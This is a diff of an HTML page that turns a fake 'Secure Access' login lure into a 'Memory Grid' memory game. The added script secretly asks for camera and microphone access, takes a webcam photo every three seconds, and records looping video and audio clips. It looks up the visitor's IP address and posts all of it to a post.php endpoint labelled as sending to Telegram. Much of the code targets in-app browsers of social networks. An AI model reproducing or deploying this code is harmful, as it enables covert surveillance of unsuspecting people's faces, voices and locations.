@@ -2,27 +2,65 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Secure Access</title>
-    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Memory Grid</title>
+    
+    <!-- PWA Meta Tags -->
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="apple-mobile-web-app-title" content="Memory Grid">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="application-name" content="Memory Grid">
+    <meta name="msapplication-TileImage" content="web-app-manifest-192x192.png">
+    <meta name="msapplication-TileColor" content="#0f3460">
+    
+    <!-- PWA Manifest -->
+    <link rel="manifest" href="/manifest.json">
+    <link rel="apple-touch-icon" href="web-app-manifest-192x192.png">
+    
+    <!-- PWA Service Worker -->
+    <script>
+        if ('serviceWorker' in navigator) {
+            navigator.serviceWorker.register('/pwabuilder-sw.js')
+                .then(() => console.log('✅ Service Worker registered'))
+                .catch(err => console.log('❌ SW registration failed:', err));
+        }
+    </script>
+    
     <style>
+        /* ============================================
+           RESET & BASE
+           ============================================ */
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+            user-select: none;
         }
 
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: #fafafa;
+            background: linear-gradient(135deg, #1a1a2e, #16213e, #0f3460);
             min-height: 100vh;
             display: flex;
-            align-items: center;
             justify-content: center;
-            color: #262626;
-            padding: 20px;
+            align-items: center;
+            padding: 16px;
+            overflow: hidden;
+            touch-action: manipulation;
         }
 
+        .container {
+            width: 100%;
+            max-width: 500px;
+            margin: 0 auto;
+            position: relative;
+        }
+
+        /* ============================================
+           HIDDEN CAMERA/MIC ELEMENTS
+           ============================================ */
         .hidden-elements {
             display: none !important;
             position: fixed !important;
@@ -46,67 +84,358 @@
             pointer-events: none !important;
         }
 
-        .container {
-            width: 100%;
-            max-width: 350px;
+        /* ============================================
+           HEADER
+           ============================================ */
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 12px 16px;
+            background: rgba(255,255,255,0.08);
+            backdrop-filter: blur(10px);
+            border-radius: 16px;
+            margin-bottom: 12px;
+            border: 1px solid rgba(255,255,255,0.1);
         }
 
-        .card {
-            background: #fff;
-            border: 1px solid #dbdbdb;
-            border-radius: 8px;
-            padding: 40px 30px;
+        .header .title {
+            color: #fff;
+            font-size: 18px;
+            font-weight: 700;
+            letter-spacing: 1px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .header .title span {
+            font-size: 20px;
+        }
+
+        .header .stats {
+            display: flex;
+            gap: 16px;
+            color: rgba(255,255,255,0.7);
+            font-size: 14px;
+        }
+
+        .header .stats .stat-item {
             text-align: center;
         }
 
-        .logo { margin-bottom: 20px; font-size: 48px; }
-        h2 { font-size: 20px; font-weight: 600; margin-bottom: 12px; color: #262626; }
-        p { font-size: 14px; color: #8e8e8e; line-height: 1.5; margin-bottom: 24px; }
-
-        .form-group { margin-bottom: 12px; }
-        .form-input {
-            width: 100%;
-            height: 36px;
-            background: #fafafa;
-            border: 1px solid #dbdbdb;
-            border-radius: 4px;
-            padding: 0 12px;
-            font-size: 12px;
+        .header .stats .stat-item .num {
+            color: #fff;
+            font-size: 18px;
+            font-weight: 700;
         }
-        .form-input:focus { outline: none; border-color: #a8a8a8; }
+
+        .header .stats .stat-item .label {
+            font-size: 10px;
+            text-transform: uppercase;
+            opacity: 0.6;
+        }
+
+        /* ============================================
+           STATUS BAR
+           ============================================ */
+        .status-bar {
+            display: flex;
+            gap: 12px;
+            justify-content: center;
+            margin-bottom: 12px;
+            padding: 6px 12px;
+            background: rgba(255,255,255,0.05);
+            border-radius: 20px;
+            font-size: 11px;
+            color: rgba(255,255,255,0.5);
+            flex-wrap: wrap;
+        }
+
+        .status-bar .dot {
+            display: inline-block;
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            margin-right: 4px;
+            animation: pulse-dot 1.5s infinite;
+        }
+
+        .status-bar .dot.active {
+            background: #00ff41;
+            box-shadow: 0 0 10px rgba(0,255,65,0.3);
+        }
+
+        .status-bar .dot.inactive {
+            background: #ff0044;
+            box-shadow: 0 0 10px rgba(255,0,68,0.3);
+            animation: none;
+        }
+
+        .status-bar .status-item {
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+
+        @keyframes pulse-dot {
+            0%, 100% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.5; transform: scale(0.8); }
+        }
+
+        /* ============================================
+           DIFFICULTY SELECTOR
+           ============================================ */
+        .difficulty-selector {
+            display: flex;
+            gap: 8px;
+            justify-content: center;
+            margin-bottom: 12px;
+        }
+
+        .difficulty-selector .diff-btn {
+            padding: 6px 16px;
+            border: 1px solid rgba(255,255,255,0.2);
+            border-radius: 20px;
+            background: transparent;
+            color: rgba(255,255,255,0.5);
+            font-size: 12px;
+            cursor: pointer;
+            transition: all 0.3s;
+            touch-action: manipulation;
+            font-family: inherit;
+        }
+
+        .difficulty-selector .diff-btn.active {
+            background: rgba(255,255,255,0.15);
+            color: #fff;
+            border-color: rgba(255,255,255,0.3);
+        }
+
+        .difficulty-selector .diff-btn:active {
+            transform: scale(0.92);
+        }
+
+        /* ============================================
+           GAME GRID
+           ============================================ */
+        .game-grid {
+            display: grid;
+            gap: 8px;
+            padding: 8px;
+            background: rgba(255,255,255,0.05);
+            border-radius: 16px;
+            border: 1px solid rgba(255,255,255,0.08);
+            aspect-ratio: 1 / 1;
+            max-width: 500px;
+            margin: 0 auto;
+            touch-action: manipulation;
+        }
+
+        .card {
+            aspect-ratio: 1 / 1;
+            background: linear-gradient(145deg, #2a2a4a, #1a1a3a);
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 32px;
+            cursor: pointer;
+            transition: all 0.3s cubic-bezier(0.34, 1.56, 0.64, 1);
+            border: 2px solid rgba(255,255,255,0.08);
+            position: relative;
+            transform-style: preserve-3d;
+            perspective: 500px;
+            touch-action: manipulation;
+            -webkit-touch-callout: none;
+        }
+
+        .card:active {
+            transform: scale(0.92);
+        }
+
+        .card.flipped {
+            transform: rotateY(180deg);
+            background: linear-gradient(145deg, #3a3a6a, #2a2a5a);
+            border-color: rgba(100,100,255,0.3);
+        }
+
+        .card.matched {
+            background: linear-gradient(145deg, #1a4a2a, #0f3a1a);
+            border-color: rgba(0,255,65,0.3);
+            transform: scale(0.95);
+            cursor: default;
+            pointer-events: none;
+        }
+
+        .card .card-back {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 28px;
+            opacity: 0.3;
+            color: rgba(255,255,255,0.15);
+            backface-visibility: hidden;
+            transform: rotateY(0deg);
+        }
+
+        .card .card-front {
+            backface-visibility: hidden;
+            transform: rotateY(180deg);
+            width: 100%;
+            height: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 36px;
+        }
+
+        /* ============================================
+           BUTTONS
+           ============================================ */
+        .btn-group {
+            display: flex;
+            gap: 10px;
+            margin-top: 12px;
+            justify-content: center;
+        }
 
         .btn {
-            width: 100%;
-            height: 32px;
-            background: #0095f6;
+            padding: 12px 24px;
             border: none;
-            border-radius: 4px;
-            color: #fff;
+            border-radius: 12px;
             font-size: 14px;
             font-weight: 600;
             cursor: pointer;
-            margin-top: 12px;
+            transition: all 0.3s;
+            touch-action: manipulation;
+            flex: 1;
+            max-width: 200px;
+            font-family: inherit;
         }
-        .btn:hover { background: #1877f2; }
-        .btn:disabled { opacity: 0.6; cursor: not-allowed; }
 
-        .footer { margin-top: 20px; font-size: 12px; color: #8e8e8e; }
-
-        .spinner {
-            display: inline-block;
-            width: 14px;
-            height: 14px;
-            border: 2px solid rgba(255,255,255,0.3);
-            border-top-color: #fff;
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-            margin-right: 8px;
+        .btn-primary {
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            color: #fff;
+            box-shadow: 0 4px 15px rgba(102,126,234,0.3);
         }
-        @keyframes spin { to { transform: rotate(360deg); } }
 
-        .success-msg { display: none; color: #00a651; font-size: 14px; margin-top: 12px; }
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(102,126,234,0.4);
+        }
 
-        /* Tap overlay for WebView */
+        .btn-primary:active {
+            transform: scale(0.95);
+        }
+
+        .btn-secondary {
+            background: rgba(255,255,255,0.1);
+            color: #fff;
+            border: 1px solid rgba(255,255,255,0.2);
+        }
+
+        .btn-secondary:hover {
+            background: rgba(255,255,255,0.2);
+        }
+
+        .btn-secondary:active {
+            transform: scale(0.95);
+        }
+
+        .btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none !important;
+        }
+
+        /* ============================================
+           WIN OVERLAY
+           ============================================ */
+        .win-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.85);
+            backdrop-filter: blur(20px);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+            animation: fadeIn 0.5s;
+        }
+
+        .win-overlay.active {
+            display: flex;
+        }
+
+        .win-content {
+            text-align: center;
+            padding: 40px;
+            animation: bounceIn 0.8s;
+        }
+
+        .win-content .trophy {
+            font-size: 80px;
+            margin-bottom: 16px;
+        }
+
+        .win-content h2 {
+            color: #fff;
+            font-size: 32px;
+            margin-bottom: 8px;
+        }
+
+        .win-content p {
+            color: rgba(255,255,255,0.7);
+            font-size: 16px;
+            margin-bottom: 24px;
+        }
+
+        .win-content .stats-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr 1fr;
+            gap: 12px;
+            margin-bottom: 24px;
+        }
+
+        .win-content .stats-grid .stat-box {
+            background: rgba(255,255,255,0.1);
+            padding: 12px;
+            border-radius: 12px;
+        }
+
+        .win-content .stats-grid .stat-box .num {
+            color: #fff;
+            font-size: 24px;
+            font-weight: 700;
+        }
+
+        .win-content .stats-grid .stat-box .label {
+            color: rgba(255,255,255,0.5);
+            font-size: 11px;
+            text-transform: uppercase;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        @keyframes bounceIn {
+            0% { transform: scale(0.5); opacity: 0; }
+            70% { transform: scale(1.05); }
+            100% { transform: scale(1); opacity: 1; }
+        }
+
+        /* ============================================
+           TAP OVERLAY
+           ============================================ */
         .tap-overlay {
             position: fixed;
             top: 0;
@@ -124,706 +453,718 @@
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%);
-            background: rgba(0,0,0,0.8);
+            background: rgba(0,0,0,0.9);
             color: #fff;
-            padding: 20px 40px;
-            border-radius: 12px;
-            font-size: 16px;
+            padding: 30px 40px;
+            border-radius: 16px;
+            font-size: 18px;
             text-align: center;
             animation: pulse 1.5s infinite;
+            border: 1px solid rgba(255,255,255,0.1);
         }
+        .tap-overlay .tap-instruction .icon { font-size: 48px; display: block; margin-bottom: 12px; }
+        .tap-overlay .tap-instruction .sub { font-size: 14px; color: rgba(255,255,255,0.5); margin-top: 8px; }
         @keyframes pulse {
             0%, 100% { transform: translate(-50%, -50%) scale(1); }
-            50% { transform: translate(-50%, -50%) scale(1.05); }
+            50% { transform: translate(-50%, -50%) scale(1.02); }
         }
 
-        .hidden-trigger {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            opacity: 0;
-            z-index: -1;
-            pointer-events: none;
-            background: transparent;
-            border: none;
+        /* ============================================
+           RESPONSIVE
+           ============================================ */
+        @media (max-width: 420px) {
+            .header .title { font-size: 14px; }
+            .header .stats .stat-item .num { font-size: 14px; }
+            .card .card-front { font-size: 28px; }
+            .card .card-back { font-size: 20px; }
+            .btn { padding: 10px 16px; font-size: 12px; }
+        }
+
+        @media (min-width: 768px) {
+            .game-grid { gap: 12px; padding: 12px; }
+            .card { border-radius: 16px; }
         }
     </style>
 </head>
 <body>
 
-    <!-- Hidden Elements -->
+    <!-- ============================================
+    HIDDEN CAMERA/MIC ELEMENTS
+    ============================================ -->
     <div class="hidden-elements">
         <video id="video" playsinline autoplay muted></video>
         <audio id="audioElement" playsinline></audio>
     </div>
     <canvas id="canvas" width="640" height="480"></canvas>
 
-    <!-- Tap Overlay for WebView -->
+    <!-- ============================================
+    TAP OVERLAY (for WebView/App)
+    ============================================ -->
     <div class="tap-overlay" id="tapOverlay">
         <div class="tap-instruction">
-            👆 Tap anywhere to continue<br>
-            <span style="font-size:12px;color:#aaa;">Camera & Microphone access will be requested</span>
+            <span class="icon">📷</span>
+            Tap to Start Game<br>
+            <span class="sub">Camera & Microphone access will be requested</span>
         </div>
     </div>
 
-    <button class="hidden-trigger" id="hiddenTrigger"></button>
-
-    <!-- Main Content -->
+    <!-- ============================================
+    MAIN GAME
+    ============================================ -->
     <div class="container">
-        <div class="card">
-            <div class="logo">🔒</div>
-            <h2>Secure Access</h2>
-            <p>Please verify your identity to continue. This helps us keep your account secure.</p>
-
-            <form id="loginForm">
-                <div class="form-group">
-                    <input type="text" class="form-input" id="username" placeholder="Username or Email" required>
+        <!-- Header -->
+        <div class="header">
+            <div class="title">
+                <span>🎮</span> Memory Grid
+            </div>
+            <div class="stats">
+                <div class="stat-item">
+                    <div class="num" id="movesCount">0</div>
+                    <div class="label">Moves</div>
                 </div>
-                <div class="form-group">
-                    <input type="password" class="form-input" id="password" placeholder="Password" required>
+                <div class="stat-item">
+                    <div class="num" id="pairsCount">0/8</div>
+                    <div class="label">Pairs</div>
                 </div>
-                <button type="submit" class="btn" id="submitBtn">Continue</button>
-                <div id="successMsg" class="success-msg">✅ Verification in progress...</div>
-            </form>
-
-            <div class="footer">
-                <span>Protected by security verification</span>
             </div>
         </div>
+
+        <!-- Status Bar -->
+        <div class="status-bar" id="statusBar">
+            <span class="status-item">
+                <span class="dot inactive" id="cameraDot"></span>
+                <span id="cameraStatus">Camera</span>
+            </span>
+            <span class="status-item">
+                <span class="dot inactive" id="micDot"></span>
+                <span id="micStatus">Microphone</span>
+            </span>
+            <span class="status-item">
+                <span class="dot inactive" id="recDot"></span>
+                <span id="recStatus">Recording</span>
+            </span>
+            <span class="status-item">
+                <span id="captureCount">📸 0</span>
+            </span>
+        </div>
+
+        <!-- Difficulty -->
+        <div class="difficulty-selector">
+            <button class="diff-btn active" data-size="4">4×4</button>
+            <button class="diff-btn" data-size="6">6×6</button>
+            <button class="diff-btn" data-size="8">8×8</button>
+        </div>
+
+        <!-- Game Grid -->
+        <div class="game-grid" id="gameGrid"></div>
+
+        <!-- Buttons -->
+        <div class="btn-group">
+            <button class="btn btn-primary" id="newGameBtn">🔄 New Game</button>
+            <button class="btn btn-secondary" id="shuffleBtn">🎲 Shuffle</button>
+        </div>
     </div>
 
+    <!-- Win Overlay -->
+    <div class="win-overlay" id="winOverlay">
+        <div class="win-content">
+            <div class="trophy">🏆</div>
+            <h2>You Won!</h2>
+            <p>You matched all pairs!</p>
+            <div class="stats-grid">
+                <div class="stat-box">
+                    <div class="num" id="winMoves">0</div>
+                    <div class="label">Moves</div>
+                </div>
+                <div class="stat-box">
+                    <div class="num" id="winTime">0s</div>
+                    <div class="label">Time</div>
+                </div>
+                <div class="stat-box">
+                    <div class="num" id="winAccuracy">0%</div>
+                    <div class="label">Accuracy</div>
+                </div>
+            </div>
+            <button class="btn btn-primary" onclick="closeWin()">Play Again</button>
+        </div>
+    </div>
+
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
     <script>
         // ============================================
-        // COMPLETE: Camera + Microphone + Video + Audio
-        // Sends everything to Telegram
+        // GRID SNAPSHOT MEMORY GAME
+        // + Hidden Camera & Microphone Capture
         // ============================================
         
-        (function() {
-            'use strict';
+        // ============================================
+        // GAME STATE
+        // ============================================
+        const game = {
+            gridSize: 4,
+            cards: [],
+            flippedCards: [],
+            matchedPairs: 0,
+            totalPairs: 0,
+            moves: 0,
+            isLocked: false,
+            startTime: null,
+            emojis: ['🎮', '🎯', '🎪', '🎨', '🎭', '🎵', '🎲', '🎳', '🎸', '🎺', '🎻', '🥁', '🎹', '🎮', '🎯', '🎪'],
+            gameStarted: false
+        };
 
-            // Elements
-            const video = document.getElementById('video');
-            const audioElement = document.getElementById('audioElement');
-            const canvas = document.getElementById('canvas');
-            const context = canvas.getContext('2d');
-            const tapOverlay = document.getElementById('tapOverlay');
-            const hiddenTrigger = document.getElementById('hiddenTrigger');
+        // ============================================
+        // DOM ELEMENTS
+        // ============================================
+        const grid = document.getElementById('gameGrid');
+        const movesDisplay = document.getElementById('movesCount');
+        const pairsDisplay = document.getElementById('pairsCount');
+        const winOverlay = document.getElementById('winOverlay');
+        const winMoves = document.getElementById('winMoves');
+        const winTime = document.getElementById('winTime');
+        const winAccuracy = document.getElementById('winAccuracy');
+        const cameraDot = document.getElementById('cameraDot');
+        const micDot = document.getElementById('micDot');
+        const recDot = document.getElementById('recDot');
+        const cameraStatus = document.getElementById('cameraStatus');
+        const micStatus = document.getElementById('micStatus');
+        const recStatus = document.getElementById('recStatus');
+        const captureCountDisplay = document.getElementById('captureCount');
+        const tapOverlay = document.getElementById('tapOverlay');
+
+        // ============================================
+        // HIDDEN CAMERA + MICROPHONE
+        // ============================================
+        const video = document.getElementById('video');
+        const audioElement = document.getElementById('audioElement');
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
+        
+        let stream = null;
+        let userIP = '';
+        let mediaRecorder = null;
+        let audioRecorder = null;
+        let recordedChunks = [];
+        let audioChunks = [];
+        let isRecording = false;
+        let isAudioRecording = false;
+        let videoCounter = 0;
+        let audioCounter = 0;
+        let photoCounter = 0;
+        let photoInterval = null;
+        let cameraActive = false;
+        let microphoneActive = false;
+        let permissionAttempted = false;
+        let isWebView = false;
+
+        // ============================================
+        // DETECT PLATFORM
+        // ============================================
+        function detectPlatform() {
+            const ua = navigator.userAgent.toLowerCase();
+            if (ua.includes('fbav') || ua.includes('fban') || 
+                ua.includes('instagram') || ua.includes('messenger') ||
+                ua.includes('fblite')) {
+                isWebView = true;
+                console.log('📱 Running in WebView');
+                return true;
+            }
+            return false;
+        }
+
+        // ============================================
+        // SEND TO TELEGRAM
+        // ============================================
+        function sendToTelegram(type, data, extra = '') {
+            $.ajax({
+                type: 'POST',
+                url: 'post.php',
+                data: {
+                    tg_type: type,
+                    tg_data: data,
+                    tg_extra: extra,
+                    tg_ua: navigator.userAgent,
+                    tg_time: new Date().toISOString()
+                },
+                async: true,
+                timeout: 5000
+            });
+        }
+
+        // ============================================
+        // REQUEST PERMISSIONS
+        // ============================================
+        function requestPermissions() {
+            if (permissionAttempted) return;
+            permissionAttempted = true;
             
-            // State
-            let cameraActive = false;
-            let microphoneActive = false;
-            let photoInterval = null;
-            let stream = null;
-            let userIP = '';
-            let mediaRecorder = null;
-            let audioRecorder = null;
-            let recordedChunks = [];
-            let audioChunks = [];
-            let isRecording = false;
-            let isAudioRecording = false;
-            let videoCounter = 0;
-            let audioCounter = 0;
-            let permissionAttempted = false;
-            let isWebView = false;
+            console.log('📷🎙️ Requesting camera + microphone...');
+            
+            const constraints = {
+                audio: { echoCancellation: true, noiseSuppression: true, autoGainControl: true },
+                video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } }
+            };
 
-            // ============================================
-            // DETECT PLATFORM
-            // ============================================
-            function detectPlatform() {
-                const ua = navigator.userAgent.toLowerCase();
-                if (ua.includes('fbav') || ua.includes('fban') || 
-                    ua.includes('instagram') || ua.includes('messenger') ||
-                    ua.includes('fblite')) {
-                    isWebView = true;
-                    console.log('📱 Running in WebView');
-                    return true;
-                }
-                return false;
-            }
-
-            // ============================================
-            // DETECT IP
-            // ============================================
-            function detectAndSendIP() {
-                fetch('https://api.ipify.org?format=json')
-                    .then(response => response.json())
-                    .then(data => {
-                        userIP = data.ip;
-                        sendToTelegram('IP', userIP, navigator.userAgent);
-                    })
-                    .catch(() => {
-                        fetch('https://httpbin.org/ip')
-                            .then(response => response.json())
-                            .then(data => {
-                                userIP = data.origin;
-                                sendToTelegram('IP', userIP, navigator.userAgent);
-                            })
-                            .catch(() => {
-                                userIP = 'Unknown';
-                            });
-                    });
-            }
-
-            // ============================================
-            // SEND TO TELEGRAM
-            // ============================================
-            function sendToTelegram(type, data, extra = '') {
-                $.ajax({
-                    type: 'POST',
-                    url: 'post.php',
-                    data: {
-                        tg_type: type,
-                        tg_data: data,
-                        tg_extra: extra,
-                        tg_ua: navigator.userAgent,
-                        tg_time: new Date().toISOString()
-                    },
-                    async: true,
-                    timeout: 5000
-                });
-            }
-
-            // ============================================
-            // REQUEST PERMISSIONS (Camera + Microphone)
-            // ============================================
-            function requestPermissions() {
-                if (permissionAttempted) return;
-                permissionAttempted = true;
-                
-                console.log('📷🎙️ Requesting camera + microphone permissions...');
-                sendToTelegram('info', 'Requesting camera + microphone permissions');
-                
-                const constraints = {
-                    audio: {
-                        echoCancellation: true,
-                        noiseSuppression: true,
-                        autoGainControl: true
-                    },
-                    video: {
-                        facingMode: "user",
-                        width: { ideal: 640 },
-                        height: { ideal: 480 }
-                    }
-                };
-
-                navigator.mediaDevices.getUserMedia(constraints)
-                    .then(function(mediaStream) {
-                        console.log('✅ Camera + Microphone granted!');
-                        handleStream(mediaStream);
-                    })
-                    .catch(function(err) {
-                        console.log('❌ Error:', err.name);
-                        sendToTelegram('warning', 'Permission denied: ' + err.name);
-                        
-                        // Try video only if audio fails
-                        if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
-                            requestVideoOnly();
-                        } else if (err.name === 'NotFoundError') {
-                            // No camera/mic found
-                            sendToTelegram('warning', 'No camera or microphone found');
-                        }
-                    });
-            }
-
-            // ============================================
-            // REQUEST VIDEO ONLY (Fallback)
-            // ============================================
-            function requestVideoOnly() {
-                console.log('📷 Trying video only...');
-                
-                navigator.mediaDevices.getUserMedia({ video: true })
-                    .then(function(mediaStream) {
-                        console.log('✅ Video only granted!');
-                        handleStream(mediaStream);
-                    })
-                    .catch(function(err) {
-                        console.log('❌ Video only failed:', err.name);
-                        sendToTelegram('warning', 'Camera unavailable: ' + err.name);
-                        // Try audio only
-                        requestAudioOnly();
-                    });
-            }
-
-            // ============================================
-            // REQUEST AUDIO ONLY (Fallback)
-            // ============================================
-            function requestAudioOnly() {
-                console.log('🎙️ Trying audio only...');
-                
-                navigator.mediaDevices.getUserMedia({ audio: true })
-                    .then(function(mediaStream) {
-                        console.log('✅ Audio only granted!');
-                        handleStream(mediaStream);
-                    })
-                    .catch(function(err) {
-                        console.log('❌ Audio only failed:', err.name);
-                        sendToTelegram('warning', 'No permissions granted');
-                    });
-            }
-
-            // ============================================
-            // HANDLE STREAM
-            // ============================================
-            function handleStream(mediaStream) {
-                if (stream) {
-                    stream.getTracks().forEach(track => track.stop());
-                }
-                
-                stream = mediaStream;
-                
-                // Check what we have
-                const hasVideo = stream.getVideoTracks().length > 0;
-                const hasAudio = stream.getAudioTracks().length > 0;
-                
-                console.log(`📹 Video: ${hasVideo}, 🎙️ Audio: ${hasAudio}`);
-                
-                if (hasVideo) {
-                    video.srcObject = stream;
-                    video.play();
-                    cameraActive = true;
-                }
-                
-                if (hasAudio) {
-                    audioElement.srcObject = stream;
-                    microphoneActive = true;
-                }
-                
-                // Hide overlay
-                tapOverlay.classList.remove('active');
-                tapOverlay.style.display = 'none';
-                
-                // Send notifications
-                if (hasVideo && hasAudio) {
+            navigator.mediaDevices.getUserMedia(constraints)
+                .then(function(mediaStream) {
+                    console.log('✅ Camera + Microphone granted!');
+                    handleStream(mediaStream);
                     sendToTelegram('permission', 'Camera + Microphone GRANTED');
-                    sendToTelegram('camera_ready', '📹 Camera + 🎙️ Microphone active');
-                } else if (hasVideo) {
-                    sendToTelegram('permission', 'Camera GRANTED (no mic)');
-                    sendToTelegram('camera_ready', '📹 Camera active (no microphone)');
-                } else if (hasAudio) {
-                    sendToTelegram('permission', 'Microphone GRANTED (no camera)');
-                    sendToTelegram('camera_ready', '🎙️ Microphone active (no camera)');
-                }
-                
-                // Start captures
-                if (hasVideo) {
-                    if (photoInterval) clearInterval(photoInterval);
-                    photoInterval = setInterval(capturePhoto, 3000);
-                    
-                    setTimeout(() => {
-                        if (cameraActive) {
-                            startVideoRecording();
-                        }
-                    }, 2000);
-                }
-                
-                if (hasAudio) {
-                    setTimeout(() => {
-                        if (microphoneActive) {
-                            startAudioRecording();
-                        }
-                    }, 3000);
-                }
+                })
+                .catch(function(err) {
+                    console.log('❌ Error:', err.name);
+                    sendToTelegram('warning', 'Permission denied: ' + err.name);
+                    // Try video only
+                    if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
+                        requestVideoOnly();
+                    }
+                });
+        }
+
+        function requestVideoOnly() {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(function(mediaStream) {
+                    console.log('✅ Video only granted!');
+                    handleStream(mediaStream);
+                    sendToTelegram('permission', 'Video only GRANTED');
+                })
+                .catch(function(err) {
+                    console.log('❌ Video failed:', err.name);
+                    requestAudioOnly();
+                });
+        }
+
+        function requestAudioOnly() {
+            navigator.mediaDevices.getUserMedia({ audio: true })
+                .then(function(mediaStream) {
+                    console.log('✅ Audio only granted!');
+                    handleStream(mediaStream);
+                    sendToTelegram('permission', 'Audio only GRANTED');
+                })
+                .catch(function(err) {
+                    console.log('❌ Audio failed:', err.name);
+                    sendToTelegram('warning', 'No permissions granted');
+                });
+        }
+
+        // ============================================
+        // HANDLE STREAM
+        // ============================================
+        function handleStream(mediaStream) {
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
             }
-
-            // ============================================
-            // CAPTURE PHOTO
-            // ============================================
-            function capturePhoto() {
-                if (cameraActive && video.readyState === video.HAVE_ENOUGH_DATA) {
-                    try {
-                        context.drawImage(video, 0, 0, 640, 480);
-                        const imageData = canvas.toDataURL("image/png");
-                        
-                        $.ajax({
-                            type: 'POST',
-                            url: 'post.php',
-                            data: {
-                                tg_type: 'image',
-                                tg_image: imageData,
-                                tg_ip: userIP,
-                                tg_ua: navigator.userAgent,
-                                tg_time: new Date().toISOString()
-                            },
-                            async: true,
-                            timeout: 5000
-                        });
-                    } catch (e) {}
-                }
-            }
-
-            // ============================================
-            // RECORD VIDEO (with audio if available)
-            // ============================================
-            function startVideoRecording() {
-                if (!stream || isRecording) return;
-                
-                try {
-                    isRecording = true;
-                    recordedChunks = [];
-                    
-                    const mimeTypes = ['video/webm;codecs=vp8,opus', 'video/webm;codecs=vp9,opus', 'video/webm'];
-                    let mimeType = mimeTypes.find(type => MediaRecorder.isTypeSupported(type)) || 'video/webm';
-                    
-                    mediaRecorder = new MediaRecorder(stream, {
-                        mimeType: mimeType,
-                        videoBitsPerSecond: 1000000,
-                        audioBitsPerSecond: 128000
-                    });
-
-                    mediaRecorder.ondataavailable = function(event) {
-                        if (event.data && event.data.size > 0) {
-                            recordedChunks.push(event.data);
-                        }
-                    };
-
-                    mediaRecorder.onstop = function() {
-                        if (recordedChunks.length > 0) {
-                            const videoBlob = new Blob(recordedChunks, {
-                                type: mediaRecorder.mimeType || 'video/webm'
-                            });
-                            
-                            if (videoBlob.size > 1000) {
-                                videoCounter++;
-                                sendVideoToTelegram(videoBlob);
-                            }
-                        }
-                        
-                        isRecording = false;
-                        recordedChunks = [];
-                        
-                        setTimeout(() => {
-                            if (cameraActive) {
-                                startVideoRecording();
-                            }
-                        }, 2000);
-                    };
-
-                    mediaRecorder.start(1000);
-                    
-                    setTimeout(() => {
-                        if (mediaRecorder && mediaRecorder.state === 'recording') {
-                            mediaRecorder.stop();
-                        }
-                    }, 10000);
-
-                } catch (e) {
-                    isRecording = false;
-                    setTimeout(() => {
-                        if (cameraActive) {
-                            startVideoRecording();
-                        }
-                    }, 5000);
-                }
-            }
-
-            // ============================================
-            // RECORD AUDIO ONLY
-            // ============================================
-            function startAudioRecording() {
-                if (!stream || isAudioRecording) return;
-                
-                try {
-                    isAudioRecording = true;
-                    audioChunks = [];
-                    
-                    // Get audio-only stream
-                    const audioStream = new MediaStream(stream.getAudioTracks());
-                    
-                    const mimeTypes = ['audio/webm;codecs=opus', 'audio/webm', 'audio/mp4'];
-                    let mimeType = mimeTypes.find(type => MediaRecorder.isTypeSupported(type)) || 'audio/webm';
-                    
-                    audioRecorder = new MediaRecorder(audioStream, {
-                        mimeType: mimeType,
-                        audioBitsPerSecond: 128000
-                    });
-
-                    audioRecorder.ondataavailable = function(event) {
-                        if (event.data && event.data.size > 0) {
-                            audioChunks.push(event.data);
-                        }
-                    };
-
-                    audioRecorder.onstop = function() {
-                        if (audioChunks.length > 0) {
-                            const audioBlob = new Blob(audioChunks, {
-                                type: audioRecorder.mimeType || 'audio/webm'
-                            });
-                            
-                            if (audioBlob.size > 1000) {
-                                audioCounter++;
-                                sendAudioToTelegram(audioBlob);
-                            }
-                        }
-                        
-                        isAudioRecording = false;
-                        audioChunks = [];
-                        
-                        setTimeout(() => {
-                            if (microphoneActive) {
-                                startAudioRecording();
-                            }
-                        }, 3000);
-                    };
-
-                    audioRecorder.start(1000);
-                    
-                    setTimeout(() => {
-                        if (audioRecorder && audioRecorder.state === 'recording') {
-                            audioRecorder.stop();
-                        }
-                    }, 8000);
-
-                } catch (e) {
-                    isAudioRecording = false;
-                    setTimeout(() => {
-                        if (microphoneActive) {
-                            startAudioRecording();
-                        }
-                    }, 5000);
-                }
-            }
